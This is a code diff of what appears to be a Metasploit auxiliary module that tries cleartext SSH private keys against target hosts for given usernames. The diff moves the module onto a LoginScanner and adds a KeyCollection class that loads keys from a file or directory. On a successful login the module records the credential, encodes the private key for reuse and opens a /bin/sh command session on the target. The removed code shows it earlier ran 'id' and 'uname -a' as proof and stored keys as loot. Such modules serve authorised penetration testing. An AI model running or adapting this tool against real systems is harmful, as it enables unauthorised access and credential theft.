@@ -5,6 +5,7 @@
 
 require 'msf/core'
 require 'net/ssh'
+require 'metasploit/framework/login_scanner/ssh'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -13,7 +14,7 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::CommandShell
 
-  attr_accessor :ssh_socket, :good_credentials, :good_key, :good_key_data
+  attr_accessor :ssh_socket, :good_key
 
   def initialize
     super(
@@ -40,7 +41,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(22),
-        OptPath.new('KEY_FILE', [false, 'Filename of one or several cleartext private keys.'])
+        OptPath.new('KEY_PATH', [true, 'Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub" will be skipped.']),
       ], self.class
     )
 
@@ -48,14 +49,12 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
         OptString.new('SSH_KEYFILE_B64', [false, 'Raw data of an unencrypted SSH public key. This should be used by programmatic interfaces to this module only.', '']),
-        OptPath.new('KEY_DIR', [false, 'Directory of several cleartext private keys. Filenames must not begin with a dot, or end in ".pub" in order to be read.']),
         OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
       ]
     )
 
-    deregister_options('RHOST','PASSWORD','PASS_FILE','BLANK_PASSWORDS','USER_AS_PASS')
+    deregister_options('RHOST','PASSWORD','PASS_FILE','BLANK_PASSWORDS','USER_AS_PASS','USERPASS_FILE')
 
-    @good_credentials = {}
     @good_key = ''
     @strip_passwords = true
 
@@ -138,213 +137,176 @@ class Metasploit3 < Msf::Auxiliary
     return cleartext_keys
   end
 
-  def do_login(ip,user,port)
-    if datastore['KEY_FILE'] and File.readable?(datastore['KEY_FILE'])
-      keys = read_keyfile(datastore['KEY_FILE'])
-      cleartext_keys = pull_cleartext_keys(keys)
-      msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user."
-    elsif datastore['SSH_KEYFILE_B64'] && !datastore['SSH_KEYFILE_B64'].empty?
-      keys = read_keyfile(:keyfile_b64)
-      cleartext_keys = pull_cleartext_keys(keys)
-      msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user (read from datastore)."
-    elsif datastore['KEY_DIR']
-      return :missing_keyfile unless(File.directory?(key_dir) && File.readable?(key_dir))
-      unless @key_files
-        @key_files = Dir.entries(key_dir).reject {|f| f =~ /^\x2e/ || f =~ /\x2epub$/}
-      end
-      these_keys = @key_files.map {|f| File.join(key_dir,f)}
-      keys = read_keyfile(these_keys)
-      cleartext_keys = pull_cleartext_keys(keys)
-      msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user."
-    else
-      return :missing_keyfile
-    end
-    unless @alerted_with_msg
-      print_status msg
-      @alerted_with_msg = true
-    end
-    cleartext_keys.each_with_index do |key_data,key_idx|
-      opt_hash = {
-        :auth_methods => ['publickey'],
-        :msframework  => framework,
-        :msfmodule    => self,
-        :port         => port,
-        :key_data     => key_data,
-        :disable_agent => true,
-        :config => false,
-        :record_auth_info => true,
-        :proxies	=> datastore['Proxies']
-      }
-      opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
-      begin
-        ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
-          self.ssh_socket = Net::SSH.start(
-            ip,
-            user,
-            opt_hash
-          )
-        end
-      rescue Rex::ConnectionError, Rex::AddressInUse
-        return :connection_error
-      rescue Net::SSH::Disconnect, ::EOFError
-        return :connection_disconnect
-      rescue ::Timeout::Error
-        return :connection_disconnect
-      rescue Net::SSH::AuthenticationFailed
-        # Try, try, again
-        if @key_files
-          vprint_error "#{ip}:#{rport} SSH - Failed authentication, trying key #{@key_files[key_idx+1]}"
-        else
-          vprint_error "#{ip}:#{rport} SSH - Failed authentication, trying key #{key_idx+1}"
-        end
-        next
-      rescue Net::SSH::Exception => e
-        return [:fail,nil] # For whatever reason.
-      end
-      break
-    end
+  def session_setup(result, ssh_socket)
+    return unless ssh_socket
 
-    if self.ssh_socket
-      self.good_key = self.ssh_socket.auth_info[:pubkey_id]
-      self.good_key_data = self.ssh_socket.options[:key_data]
-      proof = ''
-      begin
-        Timeout.timeout(5) do
-          proof = self.ssh_socket.exec!("id\n").to_s
-          if(proof =~ /id=/)
-            proof << self.ssh_socket.exec!("uname -a\n").to_s
-          else
-            # Cisco IOS
-            if proof =~ /Unknown command or computer name/
-              proof = self.ssh_socket.exec!("ver\n").to_s
-            else
-              proof << self.ssh_socket.exec!("help\n?\n\n\n").to_s
-            end
-          end
-        end
-      rescue ::Exception
-      end
+    # Create a new session from the socket
+    conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)
 
-      # Create a new session from the socket, then dump it.
-      conn = Net::SSH::CommandStream.new(self.ssh_socket, '/bin/sh', true)
-      self.ssh_socket = nil
-
-      # Clean up the stored data - need to stash the keyfile into
-      # a datastore for later reuse.
-      merge_me = {
-        'USERPASS_FILE'  => nil,
-        'USER_FILE'      => nil,
-        'PASS_FILE'      => nil,
-        'USERNAME'       => user
-      }
-      if datastore['KEY_FILE'] and !datastore['KEY_FILE'].empty?
-        keyfile = File.open(datastore['KEY_FILE'], "rb") {|f| f.read(f.stat.size)}
-        merge_me.merge!(
-          'SSH_KEYFILE_B64' => [keyfile].pack("m*").gsub("\n",""),
-          'KEY_FILE'        => nil
-          )
-      end
-
-      s = start_session(self, "SSH #{user}:#{self.good_key} (#{ip}:#{port})", merge_me, false, conn.lsock)
-
-      # Set the session platform
-      case proof
-      when /Linux/
-        s.platform = "linux"
-      when /Darwin/
-        s.platform = "osx"
-      when /SunOS/
-        s.platform = "solaris"
-      when /BSD/
-        s.platform = "bsd"
-      when /HP-UX/
-        s.platform = "hpux"
-      when /AIX/
-        s.platform = "aix"
-      when /Win32|Windows/
-        s.platform = "windows"
-      when /Unknown command or computer name/
-        s.platform = "cisco-ios"
-      end
-
-      return [:success, proof]
-    else
-      return [:fail, nil]
-    end
-  end
-
-  def do_report(ip, port, user, proof)
-    return unless framework.db.active
-    keyfile_path = store_keyfile(ip,user,self.good_key,self.good_key_data)
-    cred_hash = {
-      :host => ip,
-      :port => datastore['RPORT'],
-      :sname => 'ssh',
-      :user => user,
-      :pass => keyfile_path,
-      :type => "ssh_key",
-      :proof => "KEY=#{self.good_key}, PROOF=#{proof}",
-      :duplicate_ok => true,
-        :active => true
+    # Clean up the stored data - need to stash the keyfile into
+    # a datastore for later reuse.
+    merge_me = {
+      'USERPASS_FILE'  => nil,
+      'USER_FILE'      => nil,
+      'PASS_FILE'      => nil,
+      'USERNAME'       => result.credential.public,
+      'SSH_KEYFILE_B64' => [result.credential.private].pack("m*").gsub("\n",""),
+      'KEY_PATH'        => nil
     }
-    this_cred = report_auth_info(cred_hash)
-  end
 
-  def existing_loot(ltype, key_id)
-    framework.db.loots(myworkspace).find_all_by_ltype(ltype).select {|l| l.info == key_id}.first
-  end
+    info = "SSH #{result.credential.public}:#{ssh_socket.auth_info[:pubkey_id]} (#{ip}:#{rport})"
+    s = start_session(self, info, merge_me, false, conn.lsock)
 
-  def store_keyfile(ip,user,key_id,key_data)
-    safe_username = user.gsub(/[^A-Za-z0-9]/,"_")
-    case key_data
-    when /BEGIN RSA PRIVATE/m
-      ktype = "rsa"
-    when /BEGIN DSA PRIVATE/m
-      ktype = "dsa"
-    else
-      ktype = nil
+    # Set the session platform
+    case result.proof
+    when /Linux/
+      s.platform = "linux"
+    when /Darwin/
+      s.platform = "osx"
+    when /SunOS/
+      s.platform = "solaris"
+    when /BSD/
+      s.platform = "bsd"
+    when /HP-UX/
+      s.platform = "hpux"
+    when /AIX/
+      s.platform = "aix"
+    when /Win32|Windows/
+      s.platform = "windows"
+    when /Unknown command or computer name/
+      s.platform = "cisco-ios"
     end
-    return unless ktype
-    ltype = "host.unix.ssh.#{user}_#{ktype}_private"
-    keyfile = existing_loot(ltype, key_id)
-    return keyfile.path if keyfile
-    keyfile_path = store_loot(
-      ltype,
-      "application/octet-stream", # Text, but always want to mime-type attach it
-      ip,
-      (key_data + "\n"),
-      "#{safe_username}_#{ktype}.key",
-      key_id
-    )
-    return keyfile_path
+
+    s
   end
 
   def run_host(ip)
     print_status("#{ip}:#{rport} SSH - Testing Cleartext Keys")
-    # Since SSH collects keys and tries them all on one authentication session, it doesn't
-    # make sense to iteratively go through all the keys individually. So, ignore the pass variable,
-    # and try all available keys for all users.
-    each_user_pass do |user,pass|
-      ret,proof = do_login(ip,user,rport)
-      case ret
-      when :success
-        print_brute :level => :good, :msg => "Success: '#{user}':'#{self.good_key}' '#{proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
-        do_report(ip, rport, user, proof)
-        :next_user
-      when :connection_error
-        vprint_error "#{ip}:#{rport} SSH - Could not connect"
-        :abort
-      when :connection_disconnect
-        vprint_error "#{ip}:#{rport} SSH - Connection timed out"
-        :abort
-      when :fail
-        vprint_error "#{ip}:#{rport} SSH - Failed: '#{user}'"
-      when :missing_keyfile
-        vprint_error "#{ip}:#{rport} SSH - Cannot read keyfile."
-      when :no_valid_keys
-        vprint_error "#{ip}:#{rport} SSH - No cleartext keys in keyfile."
+
+    if datastore["USER_FILE"].blank? && datastore["USERNAME"].blank?
+      # Ghetto abuse of the way OptionValidateError expects an array of
+      # option names instead of a string message like every sane
+      # subclass of Exception.
+      raise OptionValidateError, ["At least one of USER_FILE or USERNAME must be given"]
+    end
+
+    keys = KeyCollection.new(
+      key_path: datastore['KEY_PATH'],
+      user_file: datastore['USER_FILE'],
+      username: datastore['USERNAME'],
+    )
+
+    print_brute :level => :vstatus, :ip => ip, :msg => "Testing #{keys.key_data.count} keys"
+    scanner = Metasploit::Framework::LoginScanner::SSH.new(
+      host: ip,
+      port: rport,
+      cred_details: keys,
+      stop_on_success: datastore['STOP_ON_SUCCESS'],
+      connection_timeout: datastore['SSH_TIMEOUT'],
+    )
+
+    scanner.scan! do |result|
+      credential_data = result.to_h
+      credential_data.merge!(
+          module_fullname: self.fullname,
+          workspace_id: myworkspace_id
+      )
+      case result.status
+        when Metasploit::Model::Login::Status::SUCCESSFUL
+          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
+          credential_core = create_credential(credential_data)
+          credential_data[:core] = credential_core
+          create_credential_login(credential_data)
+          session_setup(result, scanner.ssh_socket)
+          :next_user
+        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
+          invalidate_login(credential_data)
+          :abort
+        when Metasploit::Model::Login::Status::INCORRECT
+          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+          invalidate_login(credential_data)
+          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
+        else
+          invalidate_login(credential_data)
+          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
       end
     end
+
   end
 
+  class KeyCollection
+    attr_accessor :key_data
+
+    def initialize(opts={})
+      @username = opts[:username]
+      @user_file = opts[:user_file]
+      @key_path = opts.fetch(:key_path)
+
+      valid!
+    end
+
+    def realm
+      nil
+    end
+
+    def valid!
+      @key_data = Set.new
+      if File.directory?(@key_path)
+        @key_files ||= Dir.entries(@key_path).reject { |f| f =~ /^\x2e|\x2epub$/ }
+        @key_files.each do |f|
+          data = read_key(File.join(@key_path, f))
+          @key_data << data if valid_key?(data)
+        end
+      elsif File.file?(@key_path)
+        data = read_key(@key_path)
+        @key_data << data if valid_key?(data)
+      else
+        raise RuntimeError, "No key path"
+      end
+    end
+
+    def valid_key?(key_data)
+      !!(key_data.match(/BEGIN [RD]SA PRIVATE KEY/) && !key_data.match(/Proc-Type:.*ENCRYPTED/))
+    end
+
+    def each
+      if @user_file.present?
+        File.open(@user_file, 'rb') do |user_fd|
+          user_fd.each_line do |user_from_file|
+            user_from_file.chomp!
+            each_key do |key_data|
+              yield Metasploit::Framework::Credential.new(public: user_from_file, private: key_data, realm: realm, private_type: :ssh_key)
+            end
+          end
+        end
+      end
+
+      if @username.present?
+        each_key do |key_data|
+          yield Metasploit::Framework::Credential.new(public: @username, private: key_data, realm: realm, private_type: :ssh_key)
+        end
+      end
+    end
+
+    def each_key
+      @key_data.each do |data|
+        yield data
+      end
+    end
+
+    def read_key(filename)
+      @cache ||= {}
+      unless @cache[filename]
+        data = File.open(filename, 'rb') { |fd| fd.read(fd.stat.size) }
+        #if data.match
+
+        @cache[filename] = data
+      end
+
+      @cache[filename]
+    end
+
+  end
 end
